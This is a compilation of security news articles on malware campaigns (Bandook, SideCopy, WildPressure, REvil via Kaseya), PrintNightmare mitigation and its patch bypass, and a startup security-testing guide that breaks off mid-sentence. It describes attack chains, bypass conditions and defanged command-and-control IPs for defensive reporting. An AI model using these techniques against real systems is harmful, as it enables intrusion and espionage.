{'title': 'Experts Uncover Malware Attacks Targeting Corporate Networks in Latin America',
'text': 'Cybersecurity researchers on Thursday took the wraps off a new, ongoing espionage campaign targeting corporate networks in Spanish-speaking countries, specifically Venezuela, to spy on its victims.\nDubbed “Bandidos“ by ESET owing to the use of an upgraded variant of Bandook malware, the primary targets of the threat actor are corporate networks in the South American country spanning across manufacturing, construction, healthcare, software services, and retail sectors.\nWritten in both Delphi and C++, Bandook has a history of being sold as a commercial remote access trojan (RAT) dating all the way back to 2005. Since then, numerous variants have emerged on the threat landscape and put to use in different surveillance campaigns in 2015 and 2017, allegedly by a cyber-mercenary group known as Dark Caracal on behalf of government interests in Kazakhstan and Lebanon.\n\nIn a continuing resurgence of the Bandook Trojan, Check Point last year disclosed three new samples — one of which supported 120 commands — that were utilized by the same adversary to hit government, financial, energy, food industry, healthcare, education, IT, and legal institutions located in Chile, Cyprus, Germany, Indonesia, Italy, Singapore, Switzerland, Turkey, and the U.S.\nThe latest attack chain commences with prospective victims receiving malicious emails with a PDF attachment, which contains a shortened URL to download a compressed archive hosted on Google Cloud, SpiderOak, or pCloud and the password to extract it. Extracting the archive reveals a malware dropper that decodes and injects Bandook into an Internet Explorer process.\n\nInterestingly, the latest variant of Bandook analyzed by ESET contains 132 commands, up from the 120 commands reported by Check Point, implying that the criminal group behind the malware are advancing their malicious tools with improved capabilities and striking power.\n“Especially interesting is the ChromeInject functionality,“ said ESET researcher Fernando Tavella. “When the communication with the attacker’s command and control server is established, the payload downloads a DLL file, which has an exported method that creates a malicious Chrome extension. The malicious extension tries to retrieve any credentials that the victim submits to a URL. These credentials are stored in Chrome’s local storage.“\n\nSome of the main commands that the payload is capable of processing include listing directory contents, manipulating files, taking screenshots, controlling the cursor on the victim’s machine, installing malicious DLLs, terminating running processes, downloading files from a specific URL, exfiltrating the results of the operations to a remote server, and even uninstalling itself from the infected machines.\nIf anything, the development is yet another sign that adversaries can still leverage old crimeware solutions to facilitate attacks.\n“[Bandook’s] involvement in different espionage campaigns [...] shows us that it is still a relevant tool for cybercriminals,“ the researchers opined. “Also, if we consider the modifications made to the malware over the years, it shows us the interest of cybercriminals to keep using this piece of malware in malicious campaigns, making it more sophisticated and more difficult to detect.“\n\n\nFound this article interesting?

HRM is the Fix [Free eBook] →\nSecurity awareness training often isn’t enough\nIt’s easy to think that rolling out some security awareness courses and sending a few email bulletins from time to time can stop staff from engaging with phishing emails or re-using awful passwords. But, as many businesses are finding out, security awareness training alone often isn’t enough to truly boost user resilience and drive secure human behaviour.\nHere’s why:\nThe training isn’t always fit for purpose - Countless programs are created through a rushed recipe for failure — e.g., infrequent, unengaging, and generic training courses being chucked out, with the hope that employees won’t click that next phishing email and that the necessary compliance boxes are checked.Training courses are wrongly seen as a silver bullet - Regular training is vital for helping employees strengthen their security behaviour, but computer-based courses are just one tool for tackling human cyber risk. Staff needs to know their responsibilities through refined policy communications, and practical risk assessments — like phishing simulations and dark web breach scans — need to be conducted regularly to keep staff resilient to modern threats.Training results aren’t truly reflecting the human risk - Many user training programs fail to give businesses a true reflection of their ongoing human cyber risk and, instead, rely solely on security awareness training grades and (maybe) the results of sporadic phishing simulations as a way of assessing their security posture.

{'title': 'How to Mitigate Microsoft Print Spooler Vulnerability – PrintNightmare',
'text': 'This week, PrintNightmare - Microsoft’s Print Spooler vulnerability (CVE-2021-34527) was upgraded from a ’Low’ criticality to a ’Critical’ criticality.\nThis is due to a Proof of Concept published on GitHub, which attackers could potentially leverage for gaining access to Domain Controllers.\nAs we reported earlier, Microsoft already released a patch in June 2021, but it wasn’t enough to stop exploits. Attackers can still use Print Spooler when connecting remotely. You can find all you need to know about this vulnerability in this article and how you can mitigate it (and you can). \nPrint Spooler in a nutshell: Print Spooler is Microsoft’s service for managing and monitoring files printing. This service is among Microsoft’s oldest and has had minimal maintenance updates since it was released. \nEvery Microsoft machine (servers and endpoints) has this feature enabled by default.\nPrintNightmare vulnerability: As soon as an attacker gains limited user access to a network, he will be able to connect (directly or remotely) to the Print Spooler. Since the Print Spooler has direct access to the kernel, the attacker can use it to gain access to the operating system, run remote code with system privileges, and ultimately attack the Domain Controller.\nYour best option when it comes to mitigating the PrintNightmare vulnerability is to disable the Print Spooler on every server and/or sensitive workstation (such as administrators’ workstations, direct internet-facing workstations, and non-printing workstations).\nThis is what Dvir Goren’s, hardening expert and CTO at CalCom Software Solutions, suggests as your first move towards mitigation.\nFollow these steps to disable the Print Spooler service on Windows 10:\nOpen Start.Search for PowerShell, right-click on it and select the Run as administrator.Type the command and press Enter: Stop-Service -Name Spooler -ForceUse this command to prevent the service from starting back up again during restart: Set-Service -Name Spooler -StartupType Disabled\nAccording to Dvir’s experience, 90% of servers do not require Print Spooler. It is the default configuration for most of them, so it is usually enabled. As a result, disabling it can solve 90% of your problem and have little impact on production.\nIn large and complex infrastructures, it can be challenging to locate where Print Spooler is used.\nHere are a few examples where Print Spooler is required:\nWhen using Citrix services,Fax servers,Any application requiring virtual or physical printing of PDFs, XPSs, etc. Billing services and wage applications, for example.\nHere are a few examples when Print Spooler is not needed but enabled by default:\nDomain Controller and Active Directory – the main risk in this vulnerability can be neutralized by practicing basic cyber hygiene. It makes no sense to have Print Spooler enabled in DCs and AD servers. Member servers such as SQL, File System, and Exchange servers. Machines that do not require printing. \nA few other hardening steps suggested by Dvir for machines dependent on Print Spooler include:\nReplace the vulnerable Print Spooler protocol with a non-Microsoft service. By changing ’Allow Print Spooler to accept client connections’, you can restrict users’ and drivers’ access to the Print Spooler to groups that must use it.Disable Print Spooler caller in Pre-Windows 2000 compatibility group.Make sure that Point and Print is not configured to No Warning – check registry key SOFTWARE/Policies/Microsoft/Windows NT/Printers/PointAndPrint/NoElevationOnInstall for DWORD value 1 and change it to 0.Turn off EnableLUA – check registry key SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System/EnableLUA for DWORD value 0 and change it to 1.\nHere’s what you need to do next to ensure your organization is secure:\nIdentify where Print Spooler is being used on your network. Map your network to find the machines that must use Print Spooler.Disable Print Spooler on machines that do not use it. For machines that require Print Spooler – configure them in a way to minimize its attack surface. \nBeside this, to find potential evidence of exploitation, you should also monitor Microsoft-Windows-PrintService/Admin log entries. There might be entries with error messages that indicate Print Spooler can’t load plug-in module DLLs, although this can also happen if an attacker packaged a legitimate DLL that Print Spooler demands.\nThe final recommendation from Dvir is to implement these recommendations through hardening automation tools. Without automation, you will spend countless hours attempting to harden manually and may end up vulnerable or causing systems to go down\nAfter choosing your course of action, a Hardening automation tool will discover where Print Spooler is enabled, where they are actually used, and disable or reconfigure them automatically.\n\n\nFound this article interesting?

'text': 'A cyber-espionage group has been observed increasingly targeting Indian government personnel as part of a broad campaign to infect victims with as many as four new custom remote access trojans (RATs), signaling a “boost in their development operations.“\nAttributed to a group tracked as SideCopy, the intrusions culminate in the deployment of a variety of modular plugins, ranging from file enumerators to browser credential stealers and keyloggers (Xeytan and Lavao), Cisco Talos said in a report published Wednesday.\n“Targeting tactics and themes observed in SideCopy campaigns indicate a high degree of similarity to the Transparent Tribe APT (aka APT36) also targeting India,“ researchers Asheer Malhotra and Justin Thattil said. “These include using decoys posing as operational documents belonging to the military and think tanks and honeytrap-based infections.“\n\nFirst documented in September 2020 by Indian cybersecurity firm Quick Heal, SideCopy has a  history of mimicking infection chains implemented by the Sidewinder APT to deliver its own set of malware — in an attempt to mislead attribution and evade detection — while constantly retooling payloads that include additional exploits in its weaponry after a reconnaissance of the victim’s data and environment.\n\nThe adversary is also believed to be of Pakistani origin, with suspected ties to the Transparent Tribe (aka Mythic Leopard) group, which has been linked to several attacks targeting the Indian military and government entities. Past campaigns undertaken by the threat actor involve using government and military-related lures to single out Indian defense units and armed forces personnel and deliver malware capable of accessing files, clipboard data, terminating processes, and even executing arbitrary commands.\n\nThe latest wave of attacks leverages a multitude of TTPs, including malicious LNK files and decoy documents, to deliver a combination of bespoke and commercially available commodity RATs such as CetaRAT, DetaRAT, ReverseRAT, MargulasRAT, njRAT, Allakore, ActionRAT, Lillith, and Epicenter RAT. Apart from military themes, SideCopy has also been found employing calls for proposals and job openings related to think tanks in India to target potential victims.\n“The development of new RAT malware is an indication that this group of attackers is rapidly evolving its malware arsenal and post-infection tools since 2019,“ Malhotra and Thattil noted. The improvements demonstrate an effort to modularize the attack chains, while also demonstrating an increase in sophistication of the group’s tactics, the researchers said.\nBesides deploying full-fledged backdoors, SideCopy has also been observed utilizing plugins to carry out specific malicious tasks on the infected endpoint, chief among which is a Golang-based module called “Nodachi“ that’s designed to conduct reconnaissance and steal files targeting a government-mandated two-factor authentication solution called Kavach, which is required to access email services.\n\nThe goal, it appears, is to steal access credentials from Indian government employees with a focus on espionage, the researchers said, adding the threat actor developed droppers for MargulasRAT that masqueraded as installers for Kavach on Windows.\nMalware researcher @0xrb, who is also independently tracking the campaign, reached out to The Hacker News with two more IPs used by SideCopy attackers to connect to the command-and-control server — 103[.]255.7.33 and 115[.]186.190.155 — both of which are located in the city of Islamabad, lending credence to the threat actor’s Pakistani provenance.\n“What started as a simple infection vector by SideCopy to deliver a custom RAT (CetaRAT), has evolved into multiple variants of infection chains delivering several RATs,“ the researchers concluded. “The use of these many infection techniques — ranging from LNK files to self-extracting RAR EXEs and MSI-based installers — is an indication that the actor is aggressively working to infect their victims.“\nUpdate: In an independent report shared with The Hacker News, cybersecurity firm Quick Heal noted that the second wave of the digital surveillance campaign conducted by the SideCopy actor targeted critical public sector undertakings (PSUs) from telecom, power, and finance sectors located in India.\n“The evidence [...] suggests a highly organized operation designed to evade most security mechanisms,“ the researchers said, adding the malicious actors “did detailed reconnaissance before launching the attack campaign“ and “have enhanced the attack tools and methods, as compared to last year, to make detection difficult.“\n\n\nFound this article interesting?

{'title': 'Microsoft’s Emergency Patch Fails to Fully Fix PrintNightmare RCE Vulnerability',
'text': 'Even as Microsoft expanded patches for the so-called PrintNightmare vulnerability for Windows 10 version 1607, Windows Server 2012, and Windows Server 2016, it has come to light that the fix for the remote code execution exploit in the Windows Print Spooler service can be bypassed in certain scenarios, effectively defeating the security protections and permitting attackers to run arbitrary code on infected systems.\nOn Tuesday, the Windows maker issued an emergency out-of-band update to address CVE-2021-34527 (CVSS score: 8.8) after the flaw was accidentally disclosed by researchers from Hong Kong-based cybersecurity firm Sangfor late last month, at which point it emerged that the issue was different from another bug — tracked as CVE-2021-1675 — that was patched by Microsoft on June 8.\n\n“Several days ago, two security vulnerabilities were found in Microsoft Windows’ existing printing mechanism,“ Yaniv Balmas, head of cyber research at Check Point, told The Hacker News. “These vulnerabilities enable a malicious attacker to gain full control on all windows environments that enable printing.“\n“These are mostly working stations but, at times, this relates to entire servers that are an integral part of very popular organizational networks. Microsoft classified these vulnerabilities as critical, but when they were published they were able to fix only one of them, leaving the door open for explorations of the second vulnerability,“ Balmas added.\n\nPrintNightmare stems from bugs in the Windows Print Spooler service, which manages the printing process inside local networks. The main concern with the threat is that non-administrator users had the ability to load their own printer drivers. This has now been rectified.\n“After installing this [update] and later Windows updates, users who are not administrators can only install signed print drivers to a print server,“ Microsoft said, detailing the improvements made to mitigate the risks associated with the flaw. “Administrator credentials will be required to install unsigned printer drivers on a printer server going forward.“\nPost the update’s release, CERT/CC vulnerability analyst Will Dormann cautioned that the patch “only appears to address the Remote Code Execution (RCE via SMB and RPC) variants of the PrintNightmare, and not the Local Privilege Escalation (LPE) variant,“ thereby allowing attackers to abuse the latter to gain SYSTEM privileges on vulnerable systems.\n\nNow, further testing of the update has revealed that exploits targeting the flaw could bypass the remediations entirely to gain both local privilege escalation and remote code execution. To achieve this, however, a Windows policy called ’Point and Print Restrictions’ must be enabled (Computer Configuration\Policies\Administrative Templates\Printers: Point and Print Restrictions), using which malicious printer drivers could be potentially installed.\n“Note that the Microsoft update for CVE-2021-34527 does not effectively prevent exploitation of systems where the Point and Print NoWarningNoElevationOnInstall is set to 1,“ Dormann said Wednesday. Microsoft, for its part, explains in its advisory that “Point and Print is not directly related to this vulnerability, but the technology weakens the local security posture in such a way that exploitation will be possible.“\nWhile Microsoft has recommended the nuclear option of stopping and disabling the Print Spooler service, an alternative workaround is to enable security prompts for Point and Print, and limit printer driver installation privileges to administrators alone by configuring the “RestrictDriverInstallationToAdministrators“ registry value to prevent regular users from installing printer drivers on a print server.\nUPDATE: In response to CERT/CC’s report, Microsoft said on Thursday:\n“Our investigation has shown that the OOB [out-of-band] security update is working as designed and is effective against the known printer spooling exploits and other public reports collectively being referred to as PrintNightmare. All reports we have investigated have relied on the changing of default registry setting related to Point and Print to an insecure configuration.“\n\n\nFound this article interesting?

{'title': 'WildPressure APT Emerges With New Malware Targeting Windows and macOS',
'text': 'A malicious campaign that has set its sights on industrial-related entities in the Middle East since 2019 has resurfaced with an upgraded malware toolset to strike both Windows and macOS operating systems, symbolizing an expansion in both its targets and its strategy around distributing threats.\nRussian cybersecurity firm attributed the attacks to an advanced persistent threat (APT) it tracks as “WildPressure,“ with victims believed to be in the oil and gas industry. \nWildPressure first came to light in March 2020 based off of a malware operation distributing a fully-featured C++ Trojan dubbed “Milum“ that enabled the threat actor to gain remote control of the compromised device. The attacks were said to have begun as early as August 2019.\n\n“For their campaign infrastructure, the operators used rented OVH and Netzbetrieb virtual private servers (VPS) and a domain registered with the Domains by Proxy anonymization service,“ Kaspersky researcher Denis Legezo noted last year.\nSince then, new malware samples used in WildPressure campaigns have been unearthed, including a newer version of the C++ Milum Trojan, a corresponding VBScript variant with the same version number, and a Python script named “Guard“ that works across both Windows and macOS.\n\nThe Python-based multi-OS Trojan, which extensively makes of publicly available third-party code, is engineered to beacon the victim machine’s hostname, machine architecture, and OS release name to a remote server and check for installed anti-malware products, following which it awaits commands from the server that allow it to download and upload arbitrary files, execute commands, update the Trojan, and erase its traces from the infected host.\nThe VBScript version of the malware, named “Tandis,“ features similar capabilities to that of Guard and Milum, while leveraging encrypted XML over HTTP for command-and-control (C2) communications. Separately, Kaspersky said it found a number of previously unknown C++ plugins that have been used to gather data on infected systems, such as recording keystrokes and capturing screenshots.\n\nWhat’s more, in what appears to be an evolution of the modus operandi, the latest campaign — besides relying on commercial VPS — also weaved compromised legitimate WordPress websites into their attack infrastructure, with the websites serving as Guard relay servers.\nTo date, there’s neither clear visibility regarding the malware spreading mechanism nor any strong code- or victim-based similarities with other known threat actors. However, the researchers said they spotted minor ties in the techniques used by another adversary called BlackShadow, which also operates in the same region.\nThe “tactics aren’t unique enough to come to any attribution conclusion – it’s possible both groups are simply using the same generic techniques and programming approaches,“ Legezo said.\n\n\nFound this article interesting?

{'title': 'Dozens of Vulnerable NuGet Packages Allow Attackers to Target .NET Platform',
'text': 'An analysis of off-the-shelf packages hosted on the NuGet repository has revealed 51 unique software components to be vulnerable to actively exploited, high-severity vulnerabilities, once again underscoring the threat posed by third-party dependencies to the software development process.\nIn light of the growing number of cyber incidents that target the software supply chain, there is an urgent need to assess such third-party modules for any security risks and minimize the attack surface, ReversingLabs researcher Karlo Zanki said in a report shared with The Hacker News.\nNuGet is a Microsoft-supported mechanism for the .NET platform and functions as a package manager designed to enable developers to share reusable code. The framework maintains a central repository of over 264,000 unique packages that have collectively produced more than 109 billion package downloads.\n\n“All identified precompiled software components in our research were different versions of 7Zip, WinSCP and PuTTYgen, programs that provide complex compression and network functionality,“ Zanki explained. “They are continuously updated to improve their functionality and to address known security vulnerabilities. However, sometimes it happens that other software packages get updated but still keep using several years old dependencies containing known vulnerabilities.“\n\nIn one instance, it was found that “WinSCPHelper“ — a remote server file management library and which has been downloaded more than 35,000 times — uses an old and vulnerable WinSCP version 5.11.2, whereas WinSCP version 5.17.10 released earlier this January addresses a critical arbitrary execution flaw (CVE-2021-3331), thus exposing users of the package to the vulnerability.\n\nFurthermore, the researchers established that more than 50,000 software components extracted from NuGet packages were statically linked to a vulnerable version of “zlib“ data compression library, rendering them at risk of several known security issues such as CVE-2016-9840, CVE-2016-9841, CVE-2016-9842, and CVE-2016-9843.\n\nSome of the packages that were observed to have a zlib vulnerability are “DicomObjects“ and “librdkafka.redist“, each of which have been downloaded no less than 50,000 and 18.2 million times. A matter of more concern is that “librdkafka.redist“ is listed as a dependency for several other popular packages, counting Confluent’s .NET Client for Apache Kafka (Confluent.Kafka), which, in turn, has been downloaded more than 17.6 million times to date.\n“Companies developing software solutions need to become more aware of such risks, and need to become more involved in their handling,“ Zanki said. “Both the inputs and final outputs of the software development process need to be checked for tampering and code quality issues. Transparent software development is one of the keystones needed to enable early detection and prevention of software supply-chain attacks.“\n\n\nFound this article interesting?

{'title': '[Whitepaper] XDR vs. NDR/NTA – What do Organizations Truly Need to Stay Safe?',
'text': 'Security teams whose organizations are outside the Fortune 500 are faced with a dilemma. Most teams will have to choose between deploying either a network traffic analysis (NTA) or network detection and response (NDR) tool or an endpoint detection and response (EDR) tool to supplement their existing stacks.\nOn the other hand, some organizations are getting the best of both options by switching to extended detection and response (XDR) tools which often provide all these tools in one solution.\nThis is the key takeaway of a new whitepaper by security provider Cynet (download it here).\nNDR tools have become more popular, and for a good reason. They offer organizations a variety of benefits and can help further secure an environment from lateral movement attacks and further infiltration if an initial attack succeeds. NDR tools can detect a wide range of malicious activities and anomalous behaviors. \nThe question is whether the strengths of an NDR tool outweigh its limitations. \nThe pros and cons of NDR\nNDR and Network analytics tools offer two major benefits for organizations: threat detection and operational impact.\nNetwork analytics tools can help organizations detect and track a variety of anomalous behaviors and malicious actions that could indicate an attack, including: \nMalicious authentications through anomalous user actions Network-based reconnaissance activitiesUnusual login attempts that happen too close to each other, or that deviate from network behavior patterns. \nAdditionally, network analytics tools are unintrusive. They do not require endpoint installation and don’t impact live network traffic. They can also be ideal for organizations where users are not expected to install agents. \nOn the other hand, network analytics tools fall short when it comes to protecting the individual endpoints in an environment. They aren’t equipped to detect malicious file activity, process execution, and other indicators of endpoint compromise. \nThis limits their visibility and ability to protect against initial attacks. It also restricts their prevention capabilities. Instead, NDRs and other network analytics tools largely focus on detection and alerts. They also offer little in the way of remediation outside of network remediation.\nHow XDR bridges the gap\nThe solution XDRs offer to this dilemma is to consolidate a variety of both detection and response tools into a single platform. This means that on top of detection and alerts, XDRs can also automatically respond, investigate and remediate threats and attacks wherever in an environment they occur. XDRs can include a variety of tools including: \nNGAVEDR User and Entity Behavior Analytics (UEBA)NTA Deception tools\nThis removes the multiple panes of glass issue and lets organizations work with single panes. Instead of requiring a stack that integrated multiple siloed security tools, XDRs can offer a layered and natively integrated solution that can help detect threats and respond to them better. \nYou can learn more by downloading the whitepaper here. \n\n\nFound this article interesting?

'text': 'Microsoft has shipped an emergency out-of-band security update to address a critical zero-day vulnerability — known as “PrintNightmare“ — that affects the Windows Print Spooler service and can permit remote threat actors to run arbitrary code and take over vulnerable systems.\nTracked as CVE-2021-34527 (CVSS score: 8.8), the remote code execution flaw impacts all supported editions of Windows. Last week, the company warned it had detected active exploitation attempts targeting the vulnerability.\n\n“The Microsoft Windows Print Spooler service fails to restrict access to functionality that allows users to add printers and related drivers, which can allow a remote authenticated attacker to execute arbitrary code with SYSTEM privileges on a vulnerable system,“ the CERT Coordination Center said of the issue.\nIt’s worth noting that PrintNightmare includes both remote code execution and a local privilege escalation vector that can be abused in attacks to run commands with SYSTEM privileges on targeted Windows machines.\n\n“The Microsoft update for CVE-2021-34527 only appears to address the Remote Code Execution (RCE via SMB and RPC) variants of the PrintNightmare, and not the Local Privilege Escalation (LPE) variant,“ CERT/CC vulnerability analyst Will Dormann said.\nThis effectively means that the incomplete fix could still be used by a local adversary to gain SYSTEM privileges.

'text': 'Law enforcement authorities with the Interpol have apprehended a threat actor responsible for targeting thousands of unwitting victims over several years and staging malware attacks on telecom companies, major banks, and multinational corporations in France as part of a global phishing and credit card fraud scheme.\nThe two-year investigation, dubbed Operation Lyrebird by the international, intergovernmental organization, resulted in the arrest of a Moroccan citizen nicknamed Dr HeX, cybersecurity firm Group-IB disclosed today in a report shared with The Hacker News.\n\nDr HeX is said to have been “active since at least 2009 and is responsible for a number of cybercrimes, including phishing, defacing, malware development, fraud, and carding that resulted in thousands of unsuspecting victims,“ the Singapore-headquartered company said.\nThe cyber attacks involved deploying a phishing kit consisting of web pages that spoofed banking entities in the country, followed by sending mass emails mimicking the targeted companies, prompting email recipients to enter login information on the rogue website.\nThe credentials entered by unsuspecting victims on the fake web page were then redirected to the perpetrator’s email. At least three different phishing kits presumably developed by the threat actor have been extracted.\n\nThe phishing kits were also “sold to other individuals through online forums to allow them to facilitate similar malicious campaigns against victims,“ Interpol said in a statement. “These were then used to impersonate online banking facilities, allowing the suspect and others to steal sensitive information and defraud trusting individuals for financial gain, with the losses of individuals and companies published online in order to advertise these malicious services.“\nThe scripts included in the phishing kit contained the name Dr HeX and the individual’s contact email address, using which the cybercriminal was eventually identified and deanonymized, in the process uncovering a YouTube channel as well as another name used by the adversary to register at least two fraudulent domains that were used in the attacks.\nAdditionally, Group-IB said it was also able to map the email address to the malicious infrastructure employed by the accused in various phishing campaigns, of which included as many as five email addresses, six nicknames, and his accounts on Skype, Facebook, Instagram, and YouTube.\n\nIn all, Dr Hex’s digital footprint left a tell-tale trail of malicious activities over a period stretching between 2009 and 2018, during when the attacker defaced no fewer than 134 web pages, along with creating posts on different underground forums devoted to malware trading and evidence suggesting his involvement in attacks on French corporations to steal financial information.\n“The suspect, in particular, promoted so-called Zombi Bot, which allegedly contained 814 exploits, including 72 private ones, a brute-forcer, webshell and backdoor scanners, as well as functionality to carry out DDoS attacks,“ Group-IB CTO Dmitry Volkov told The Hacker News.\n\n\nFound this article interesting?

'text': 'U.S. technology firm Kaseya, which is firefighting the largest ever supply-chain ransomware strike on its VSA on-premises product, ruled out the possibility that its codebase was unauthorizedly tampered with to distribute malware.\nWhile initial reports raised speculations that REvil, the ransomware gang behind the attack, might have gained access to Kaseya’s backend infrastructure and abused it to deploy a malicious update to VSA servers running on client premises, in a modus operandi similar to that of the devastating SolarWinds hack, it has since emerged that a never-before-seen security vulnerability (CVE-2021-30116) in the software was leveraged to push ransomware to Kaseya’s customers.\n\n“The attackers were able to exploit zero-day vulnerabilities in the VSA product to bypass authentication and run arbitrary command execution,“ the Miami-headquartered company noted in the incident analysis. “This allowed the attackers to leverage the standard VSA product functionality to deploy ransomware to endpoints. There is no evidence that Kaseya’s VSA codebase has been maliciously modified.“\nIn other words, while successful zero-day exploitation on Kaseya VSA software by itself isn’t a supply-chain attack, taking advantage of the exploit to compromise managed service providers (MSPs) and breach their customers would constitute as one.\nIt’s, however, unclear as to how the hackers learned of the vulnerabilities. The details of those flaws have not yet been publicly released, although Huntress Labs revealed that “Cybercriminals have exploited an arbitrary file upload and code injection vulnerability and have high confidence an authentication bypass was used to gain access into these servers.“\nImage Source: Cybereason\nAbout 60 MSPs and 1,500 downstream businesses around the world have been paralyzed by the ransomware attack, according to the company’s CEO Fred Voccola, most of which have been small concerns, like dental practices, architecture firms, plastic surgery centers, and libraries.\nHackers associated with the Russia-linked REvil ransomware-as-a-service (RaaS) group initially demanded $70 million in Bitcoins to release a decryptor tool for restoring all the affected businesses’ data, although they have swiftly lowered the asking price to $50 million, suggesting a willingness to negotiate their demands in return for a lesser amount.\n“REvil ransomware has been advertised on underground forums for three years and it is one of the most prolific RaaS operations,“ Kaspersky researchers said Monday, adding “the gang earned over $100 million from its operations in 2020.“\n\nThe attack chain worked by first deploying a malicious dropper via a PowerShell script which was executed through Kaseya’s VSA software.\n“This script disables Microsoft Defender for Endpoint protection features and then uses the certutil.exe utility to decode a malicious executable (agent.exe) that drops a legitimate Microsoft binary (MsMpEng.exe, an older version of Microsoft Defender) and malicious library (mpsvc.dll), which is the REvil ransomware. This library is then loaded by the legitimate MsMpEng.exe by utilizing the DLL side-loading technique,“ the researchers added.\nThe incident has also led the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to offer mitigation guidance, urging businesses to enable multi-factor authentication, limit communication with remote monitoring and management (RMM) capabilities to known IP address pairs, and place administrative interfaces of RMM behind a virtual private network (VPN) or a firewall on a dedicated administrative network.\n\n\nFound this article interesting?

{'title': 'Getting Started with Security Testing: A Practical Guide for Startups',
'text': 'A common misconception among startup founders is that cybercriminals won’t waste time on them, because they’re not big or well known enough yet.\nBut just because you are small doesn’t mean you’re not in the firing line. The size of a startup does not exempt it from cyber-attacks – that’s because hackers constantly scan the internet looking for flaws that they can exploit; one slip up, and your business can become front-page news, for the wrong reasons.\nFortunately, buyers are also becoming increasingly aware of the importance of cybersecurity and are commonly asking startups about the processes they use to secure their data - meaning cybersecurity is now becoming an important business enabler.\nSo if you’re a CTO thinking about ramping up your web or mobile apps’ cybersecurity posture, then you are already on the right track, but with so many options, where should you start?\nTo help you get going, we created this guide that covers the following crucial points:\nAnswering the question, “What is security testing?“Understanding the reasons to perform security testingDefining the scope of cybersecurity testingKnowing when to perform penetration testing\nWhat Is Security Testing?\nSecurity testing is a broad term that refers to the process of checking a system, network, or piece of software for vulnerabilities that hackers and other threat actors can take advantage of. It can come in many forms, so in this article, we will explore two of its major components:\nVulnerability Assessment: an automated security test using tools to scan your systems or applications for security issues. These tools are called “vulnerability scanners“, and they perform automated tests to uncover flaws within your applications or infrastructure. The types of flaws could be application-level weaknesses, cloud configuration issues, or simply surfacing software with missing security patches (one of the most common causes of cybersecurity breaches).Penetration Testing: Primarily a manual assessment by a cybersecurity expert (although it is usually supported by vulnerability scanning tools), as well as determining the extent by which threat actors can exploit vulnerabilities.\nPenetration testing is a great way to find the most amount of weaknesses possible at a certain point in time, but you should consider how quickly you get alerted to new vulnerabilities after the pen testers have gone home (tip: not quickly enough, you’ll want a vulnerability scanner for that).\nVulnerability scanners also enable organizations to learn more about their security status before committing to more in-depth and usually more expensive manual tests. This is a no-brainer in many cases, as penetration testers will often start their tests by running the same automated tools. And you wouldn’t want to make it too easy for them, would you! ;)\nWhy Perform Security Testing?\nVeracode’s State of Software Security Report revealed that 83% of the study sample, comprising 85,000 software applications used by 2,300 companies worldwide, had at least one security vulnerability discovered during an initial security test. Without the test, these flaws would have been released into production, making the software vulnerable to cyber attacks.\nIf, for this reason, you’ve decided to start security testing simply to find your weaknesses before the hackers do, then great. You’ve got the flexibility to decide your own requirements; skip ahead to the next section. Otherwise, other common reasons to perform security testing are:\n‍Third-party or customer requests. If partners or customers have specifically requested that you perform security testing to ensure that their customer data remains safe from cyber attackers – you may have more stringent requirements. However, there can still be room for interpretation. It’s very common that customers will require a “penetration test,“ – but they rarely specify what that means exactly.‍Compliance certifications and industry regulations. Many industry regulations or compliance certifications also require organizations to undergo regular security testing. Common examples include ISO 27001, PCI DSS, and SOC2. These standards specify the testing required in various levels of detail, but even the most specific doesn’t specify exactly how or what to test, as it depends on the scenario at hand. For this reason, it’s often accepted that the company being tested is best placed to determine what level of security testing makes sense in their scenario. So you may find the guidance below is still useful in determining what and how to test.\nYour customer or auditor will always have the last call, but you know your business best, so by proposing a sensible testing strategy, usually both sides can find an agreement.\nThink about Strategy before Individual Security Tests\nRisk Assessment: How much of a target are you?\nEvery company is unique, and for that reason, your risk will be unique to you. However, it can be hard to know what’s the right level of testing. You can use the following as a rough guide to what we see in the industry:\n1. If you don’t store particularly sensitive data\nFor example, you might provide a website uptime monitoring tool and don’t store particularly sensitive data. Until you grow large enough to be targeted specifically, you probably only need to worry about indiscriminate hacks by those looking for easy pickings. If so, you’re more likely only to need automated vulnerability scans.\nFocusing on any internet-exposed (or potentially exposed) systems like any remote access (VPNs, remote admin logins), firewalls, websites or applications, APIs, as well as systems that may find themselves online by accident (anything inside a cloud platform can too easily be put on the internet by accident).\n2. If you store customer data\n‍Maybe you’re a marketing data analysis platform, so you may face less threats from insiders and criminal gangs, but you certainly need to worry about customers accessing each other’s data or a general data breach. Or, for example, you have an app, but anyone can register for an account online, you will want to consider an “authenticated“ penetration test from the perspective of a normal user – but maybe not from the perspective of an employee with limited back-end access. You’ll also want to make sure employee laptops are fully patched with the latest security updates.\n3. If you’re offering a financial service\nIf you’re aFinTech startup moving money around, you will need to worry about malicious customers and even malicious employees – as well as cybercriminal gangs targeting you.\nIf so, you will want to consider continuous vulnerability assessment and regular full manual penetration tests from all these scenarios on top.\n4. If you don’t have anything exposed to the internet\nMaybe you don’t have anything exposed to the internet at all or don’t develop customer-facing applications – so your main attack surface is employee laptops and cloud services. In this case, automated vulnerability scanning of your own laptops makes the most sense, and you could consider a more aggressive type of penetration testing “known as red teaming“ if you need additional assurance.Every business is unique, and there is no single cybersecurity strategy that will work for every startup. This is why you need to begin with an understanding of where your own risks reside.\nWhat do you need to protect?\nIdeally, before planning the security testing itself, you should consider what assets you have, both technical and informational, a process known as “asset management.“\nA very simple example could be: “We have 70 employee laptops, use mostly cloud services, and have our customer data stored and backed up in Google Cloud Platform, and an app that allows both admin and customer access.\nOur most important data is the data we store on behalf of customers, and our employee data in our HR systems.“. Thinking this through then helps you start to form the basis for scoping a test. For example:\nOur HR system is a cloud service, so we simply ask them for their proof of security testing (and so don’t need to test them ourselves).What IP addresses do we have in Google Cloud, what domains are registered (there are tools that can help with this).Our engineers don’t download the production database, but do have access to our cloud systems, so their laptops and cloud & email accounts are also part of our attack surface.\nPerforming asset management will help you keep track of systems belonging to your organization as well as determine which IP addresses and domain names need to be tested.\nHow Often Should a Startup Perform Security Testing?\nIt depends on the type of test! Clearly, the benefit of automated tests is they can be run as regularly as you want. While penetration tests are more costly to run frequently.\nPerforming routine vulnerability scanning at least once a month can help strengthen your IT infrastructure and is recommended by the National Cyber Security Centre (NCSC). This practice helps companies keep an eye on the never ending list of new threats; over 10,000 new vulnerabilities are reported every year. Aside from regular vulnerability scanning, it is also advisable to run scans every time system changes are made. \nTypes of Vulnerability Scanner\nYou can choose from several types of vulnerability scanners— network-based, agent-based, web application, and infrastructure. The choice depends on what assets you aim to protect.\nSome 